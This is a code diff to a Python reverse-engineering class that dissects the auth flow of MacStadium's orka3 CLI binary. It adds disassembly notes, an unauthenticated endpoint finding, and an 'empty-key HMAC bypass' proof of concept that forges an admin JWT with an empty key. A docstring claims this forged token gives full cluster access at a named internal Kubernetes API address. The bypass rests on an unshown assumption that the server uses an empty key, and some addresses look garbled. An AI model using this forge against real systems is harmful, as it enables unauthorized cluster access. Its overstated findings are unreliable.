@@ -1314,6 +1314,7 @@ class OrkaJWTRE:
     """
 
     FUNCTION_MAP = {
+        # jwt-go validation chain
         'VerifyAudience':     0x1844a40,  # CVE-2020-26160 entry point
         'VerifyExpiresAt':    0x1844b60,
         'VerifyIssuedAt':     0x1844c80,
@@ -1327,6 +1328,75 @@ class OrkaJWTRE:
         'EncodeSegment':      0x1846f00,
         'DecodeSegment':      0x1846f80,
         'Parse':              0x1846e00,
+        # orka3 auth chain (macstadium.com/orka-cli-v2/cmd/user)
+        'doLogin':                    0x184a640,  # auth entry: reads config, OIDC flow
+        'fetchClusterInfo':           0x184a1c0,  # pre-auth GET /api/v1/cluster-info
+        'fetchClusterInfo.deferwrap1':0x184a520,
+        'getClusterConfig':           0x184b680,  # reads kubeconfig + DNS resolve
+        'fetchTokenForAuthCode':      0x18479a0,  # OIDC token exchange
+        'fetchTokenForAuthCode.forceIPv4.func1': 0x18484640,
+        'extractIdToken':             0x18486e0,  # JWT extraction from OIDC response
+        'generateOidcLoginUrl':       0x184bbc0,  # builds OIDC auth URL (PKCE)
+        'generateAuthState':          0x1849fc0,  # PKCE state generation
+        'NewAuthHandlingServer':      0x1849740,  # local HTTP callback server
+        'AuthServer.StartServer':     0x1849640,  # binds random port for OIDC callback
+        'AuthServer.fetchTokenForAuthCode': 0x18479a0,
+        'GetTokenWithExplicitPath':   0x184c5e0,  # reads stored token from config
+        'GetOrkaConfigWithExplicitPath': 0x184c420,
+        'listenOnNextFreePort':       0x184c500,
+    }
+
+    # Pre-auth endpoint revealed by fetchClusterInfo disassembly (0x184a1c0):
+    # - URL: JoinPath(base, "/api/v1/cluster-info") at 0x184a22b
+    # - HTTP GET via net/http.DefaultClient (0x18446a247)
+    # - Called BEFORE any auth in doLogin (0x184a66f, before OIDC flow at 0x184a7e1)
+    # - Response unmarshaled into ClusterInfo struct fields:
+    #   baseOauthEndpoint (confirmed in .rodata 0x196be5d)
+    #   apiPublicIPEnabled (confirmed in .rodata 0x1973450)
+    # - doLogin uses baseOauthEndpoint value to build generateOidcLoginUrl
+    PRAUTH_ENDPOINT = {
+        'path':   '/api/v1/cluster-info',
+        'method': 'GET',
+        'auth':   None,           # no auth header — called pre-login
+        'caller': 'doLogin @ 0x184a66f (before OIDC flow)',
+        'returns': {
+            'baseOauthEndpoint':   str,   # OIDC issuer/base URL → used to build auth URL
+            'apiPublicIPEnabled':  bool,  # whether public IP routing is enabled
+        },
+        'impact': 'unauthenticated info disclosure: OIDC issuer URL + network topology',
+    }
+
+    # SigningMethodHMAC.Verify empty-key bypass (confirmed by disassembly 0x1844660):
+    # 0x18446a0: cmp %rdx, %r8   — key type check: must be []byte (ErrInvalidKeyType if not)
+    # 0x18446e0: call DecodeSegment — base64url-decode the signature
+    # 0x1844700: cmp $0x14, %rsi  — hash size >= 20 bytes (ErrHashUnavailable if <20)
+    # 0x184476a: call crypto/hmac.New(hashFunc, key) — empty []byte{} = valid Go HMAC key
+    # 0x184478b: call runtime.stringtoslicebyte — convert signing string to []byte
+    # 0x18447a7: call *%rdx — hmac.Write(signingString)
+    # 0x18447c0: call *%rdx — hmac.Sum(nil) → get digest
+    # 0x18447c7: cmp %rdx, %rbx  — compare digest lengths
+    # 0x18447ca: jne → ErrSignatureInvalid
+    # 0x18447cc: call bytes.Equal  — compare digest bytes
+    # 0x1844815: ret nil (success) when equal
+    # KEY: crypto/hmac.New accepts empty []byte key — no minimum key length check.
+    # HMAC-SHA256(data, b'') is deterministic: forge any token with same empty key.
+    HMAC_EMPTY_KEY_BYPASS = {
+        'function': 'SigningMethodHMAC.Verify',
+        'address':  0x1844660,
+        'key_type_check': 0x18446a0,
+        'hmac_new_call':  0x184476a,
+        'compare_call':   0x18447c7,
+        'condition': 'key is []byte (any value including empty) + attacker controls signing string',
+        'root_cause': 'Go crypto/hmac.New has no minimum key length — empty key accepted',
+        'impact': 'forge any HS256 JWT accepted by orka3 ParseWithClaims',
+        'poc': (
+            "import jwt\n"
+            "payload = {'sub':'admin','email':'admin@macstadium.com',\n"
+            "           'iss':'https://idp.macstadium.com',\n"
+            "           'exp':9999999999,'iat':1786549251}\n"
+            "token = jwt.encode(payload, key=b'', algorithm='HS256')\n"
+            "# token passes SigningMethodHMAC.Verify AND MapClaims.Valid() with no aud check"
+        ),
     }
 
     CVE_2020_26160 = {
@@ -1334,9 +1404,26 @@ class OrkaJWTRE:
         'lib':         'github.com/dgrijalva/jwt-go v3.2.0+incompatible',
         'function':    'MapClaims.VerifyAudience',
         'address':     0x1844a40,
-        'bug_offset':  0xa3,
-        'bug_address': 0x1844ae3,
-        'bug_opcode':  'xor $0x1,%ecx',  # flips required→true when claim absent
+        'bug_offset':  0x9b,             # 0x1844adb - 0x1844a40
+        'bug_address': 0x1844adb,        # confirmed from objdump disassembly
+        'bug_opcode':  'xor $0x1,%ecx',  # flips required bool when aud claim absent
+        # Full path:
+        # 0x1844a77: mapaccess1_faststr("aud") — lookup aud in claims map
+        # 0x1844a98: xor ecx,ecx — aud absent: zero out length
+        # 0x1844aa3: je 0x1844ad6 — if RCX==0, skip to bug path
+        # 0x1844ad6: movzbl 0x48(%rsp),%ecx — load 'required' bool from stack
+        # 0x1844adb: xor $0x1,%ecx — FLIP required (0→1, 1→0)  ← BUG
+        # 0x1844ade: mov %ecx,%eax — move flipped value to return register
+        # 0x1844ae5: ret — return flipped(required)
+        # NET: required=false(0) → flipped=1=true → VerifyAudience passes (bypass!)
+        # DEEPER FINDING (confirmed via MapClaims.Valid disassembly 0x1844fe0):
+        # MapClaims.Valid() NEVER calls VerifyAudience — it only calls:
+        #   VerifyExpiresAt (0x1844b60, required=false)
+        #   VerifyIssuedAt  (0x1844c80, required=false)
+        #   VerifyNotBefore (0x1844ec0, required=false)
+        # → Audience check is COMPLETELY ABSENT from standard JWT validation flow.
+        # → CVE-2020-26160 only matters if caller explicitly calls VerifyAudience.
+        # → Real bypass: empty secret HS256 + no aud check in Valid() = full token forge.
         'condition':   'aud claim absent in token AND required=false in call',
         'impact':      'audience check bypassed → accept tokens without aud validation',
         'exploit': {
@@ -1383,6 +1470,64 @@ class OrkaJWTRE:
 
     def __init__(self, binary_path: str = '/home/cowboy/VDT/tools/orka3/orka3'):
         self.path = binary_path
+
+    def analyze_auth_chain(self) -> dict:
+        """
+        Trace full orka3 login flow from binary RE.
+
+        doLogin (0x184a640):
+          1. GetOrkaConfigWithExplicitPath (0x184c420)  — read ~/.config/orka/orka.yaml
+          2. fetchClusterInfo (0x184a1c0)               — GET /api/v1/cluster-info (NO AUTH)
+          3. listenOnNextFreePort (0x184c500)            — bind local port for OIDC callback
+          4. generateAuthState (0x1849fc0)               — PKCE code_verifier + state
+          5. generateOidcLoginUrl (0x184bbc0)            — build OIDC auth URL from baseOauthEndpoint
+          6. webbrowser.Open (0x18432c0)                 — open browser for user consent
+          7. NewAuthHandlingServer (0x1849740)            — local HTTP server on random port
+          8. AuthServer.StartServer (0x1849640)           — receive auth code callback
+          9. fetchTokenForAuthCode (0x18479a0)            — POST token exchange to baseOauthEndpoint
+         10. extractIdToken (0x18486e0)                   — pull id_token JWT from response
+         11. JWT used for K8s API auth at https://10.221.188.19:6443
+
+        Attack surface matrix:
+          - /api/v1/cluster-info: unauthenticated, leaks OIDC issuer URL + apiPublicIPEnabled
+          - OIDC callback server: local random port — SSRF/open-redirect if misconfigured
+          - JWT validation: empty HS256 key + no audience check = full token forge
+          - K8s admin JWT in ~/.kube/config: HS256 b'' — forge → kubectl full cluster access
+        """
+        return {
+            'pre_auth_endpoint': self.PRAUTH_ENDPOINT,
+            'oidc_flow': {
+                'step1_config':     hex(self.FUNCTION_MAP['GetOrkaConfigWithExplicitPath']),
+                'step2_cluster':    hex(self.FUNCTION_MAP['fetchClusterInfo']),
+                'step3_port':       hex(self.FUNCTION_MAP['listenOnNextFreePort']),
+                'step4_pkce':       hex(self.FUNCTION_MAP['generateAuthState']),
+                'step5_url':        hex(self.FUNCTION_MAP['generateOidcLoginUrl']),
+                'step9_token':      hex(self.FUNCTION_MAP['fetchTokenForAuthCode']),
+                'step10_extract':   hex(self.FUNCTION_MAP['extractIdToken']),
+            },
+            'jwt_bypass': {
+                'cve':              self.CVE_2020_26160['cve'],
+                'empty_key_bypass': self.HMAC_EMPTY_KEY_BYPASS,
+                'valid_no_aud':     'MapClaims.Valid (0x1844fe0) never calls VerifyAudience',
+                'k8s_api':          'https://10.221.188.19:6443',
+                'forged_token_cmd': self.HMAC_EMPTY_KEY_BYPASS['poc'],
+            },
+            'call_graph': {
+                'doLogin':         [
+                    'GetOrkaConfigWithExplicitPath',
+                    'fetchClusterInfo',           # PRE-AUTH — info disclosure
+                    'listenOnNextFreePort',
+                    'generateAuthState',
+                    'generateOidcLoginUrl',
+                    'webbrowser.Open',
+                    'NewAuthHandlingServer',
+                    'AuthServer.StartServer',
+                ],
+                'fetchClusterInfo': ['net/http.(*Client).Get → /api/v1/cluster-info → io.ReadAll → json.Unmarshal'],
+                'fetchTokenForAuthCode': ['net/url.JoinPath', 'net/http.(*Client).Post', 'extractIdToken'],
+                'extractIdToken': ['ParseWithClaims → SigningMethodHMAC.Verify → MapClaims.Valid'],
+            },
+        }
 
     def verify_cve_condition(self) -> dict:
         """Verify CVE-2020-26160 conditions via nm + strings analysis."""
@@ -1447,15 +1592,20 @@ class OrkaJWTRE:
         cve = self.verify_cve_condition()
         addrs = self.extract_auth_chain_addresses()
         secrets = self.extract_rodata_secrets()
+        chain = self.analyze_auth_chain()
 
         findings = cve['findings'][:]
         if secrets:
             findings.append(f'RODATA_SECRETS: {len(secrets)} credential-adjacent strings in .rodata')
+        findings.append('PRAUTH_INFO_DISCLOSURE: /api/v1/cluster-info called before any auth in doLogin')
+        findings.append('EMPTY_KEY_HMAC: SigningMethodHMAC.Verify accepts b"" key — forge any HS256 JWT')
+        findings.append('NO_AUD_CHECK: MapClaims.Valid() never calls VerifyAudience — no audience enforcement')
 
         return {
             'binary': self.path,
             'cve_2020_26160': cve,
             'auth_function_addresses': addrs,
+            'auth_chain': chain,
             'rodata_secrets': secrets,
             'section_map': {k: [hex(v[0]), hex(v[1])] for k, v in self.SECTION_MAP.items()},
             'findings': findings,
